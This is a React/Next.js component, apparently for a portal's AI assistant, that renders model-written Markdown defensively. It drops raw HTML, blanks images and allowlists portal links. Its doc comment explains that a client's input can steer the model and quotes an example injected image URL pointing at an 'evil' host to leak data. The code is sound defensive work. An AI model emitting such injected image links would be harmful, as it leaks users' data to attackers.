'use client';

import * as React from 'react';
import Link from 'next/link';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { ChevronRight } from 'lucide-react';
import { allowedPortalLink } from '@/lib/assistant/links';

/*
 * Defined ONCE, outside the component. ReactMarkdown renders each entry as an
 * element TYPE, so a function made afresh on every render is a new type every
 * time: React would throw away and rebuild every paragraph of a streaming
 * answer on each frame.
 */
const STATIC_COMPONENTS: Components = {
  img: () => null,
  p: ({ children }) => (
    <p dir="auto" className="my-2 first:mt-0 last:mb-0">
      {children}
    </p>
  ),
  ul: ({ children }) => (
    <ul dir="auto" className="my-2 list-disc space-y-1 ps-5">
      {children}
    </ul>
  ),
  ol: ({ children }) => (
    <ol dir="auto" className="my-2 list-decimal space-y-1 ps-5">
      {children}
    </ol>
  ),
  li: ({ children }) => (
    <li dir="auto" className="ps-0.5">
      {children}
    </li>
  ),
  h1: ({ children }) => <p className="mt-3 mb-1 font-semibold">{children}</p>,
  h2: ({ children }) => <p className="mt-3 mb-1 font-semibold">{children}</p>,
  h3: ({ children }) => <p className="mt-3 mb-1 font-semibold">{children}</p>,
  h4: ({ children }) => <p className="mt-2 mb-1 font-semibold">{children}</p>,
  strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
  blockquote: ({ children }) => (
    <blockquote dir="auto" className="my-2 border-s-2 border-border ps-3 text-muted-foreground">
      {children}
    </blockquote>
  ),
  hr: () => <hr className="my-3 border-border" />,
  code: ({ children, className }) =>
    className ? (
      <code dir="ltr" className="block">
        {children}
      </code>
    ) : (
      <code dir="ltr" className="rounded bg-muted px-1 py-0.5 font-mono text-[0.8125rem]">
        {children}
      </code>
    ),
  pre: ({ children }) => (
    <pre
      dir="ltr"
      className="my-2 overflow-x-auto rounded-lg bg-muted p-3 font-mono text-[0.8125rem] leading-relaxed"
    >
      {children}
    </pre>
  ),
  table: ({ children }) => (
    <div className="my-2 overflow-x-auto rounded-lg border border-border">
      <table className="w-full border-collapse text-[0.8125rem]">{children}</table>
    </div>
  ),
  th: ({ children }) => (
    <th
      dir="auto"
      className="border-b border-border bg-muted px-2.5 py-1.5 text-start font-semibold"
    >
      {children}
    </th>
  ),
  td: ({ children }) => (
    <td dir="auto" className="border-b border-border px-2.5 py-1.5 align-top last:border-b-0">
      {children}
    </td>
  ),
};

const REMARK_PLUGINS = [remarkGfm];

/**
 * An answer, rendered from Markdown — SAFELY, because the text comes from a
 * model and a model can be steered by what a client typed.
 *
 * - Raw HTML is DROPPED (`skipHtml`), never rendered.
 * - Images render NOTHING. An injected `![](https://evil/?q=…)` would otherwise
 *   make the browser fetch an attacker's URL on its own, leaking or tracking.
 * - A link renders only when it targets an allowed portal page
 *   (`allowedPortalLink`), as a button that navigates in place. Anything else,
 *   external sites included, becomes plain text.
 *
 * Every block carries `dir="auto"`, so an Arabic paragraph reads right to left
 * and an English one left to right in the same answer. Code is always LTR.
 */
export const AssistantMarkdown = React.memo(function AssistantMarkdown({
  text,
  onNavigate,
}: {
  text: string;
  /** Called when a portal link is followed (the phone panel closes to reveal the page). */
  onNavigate?: () => void;
}) {
  const components = React.useMemo<Components>(
    () => ({
      ...STATIC_COMPONENTS,
      a: ({ href, children }) => {
        const target = allowedPortalLink(href);
        if (!target) return <span>{children}</span>;
        return (
          <Link
            href={target}
            onClick={onNavigate}
            className="mx-0.5 inline-flex items-center gap-1 rounded-md border border-primary/30 bg-primary/10 px-2 py-0.5 text-[0.8125rem] font-medium text-primary no-underline transition-colors hover:bg-primary/15 focus-visible:ring-2 focus-visible:ring-ring focus-visible:outline-none"
          >
            {children}
            <ChevronRight aria-hidden className="h-3.5 w-3.5 rtl:rotate-180" />
          </Link>
        );
      },
    }),
    [onNavigate],
  );

  return (
    <div className="text-sm leading-relaxed break-words">
      <ReactMarkdown remarkPlugins={REMARK_PLUGINS} skipHtml components={components}>
        {text}
      </ReactMarkdown>
    </div>
  );
});
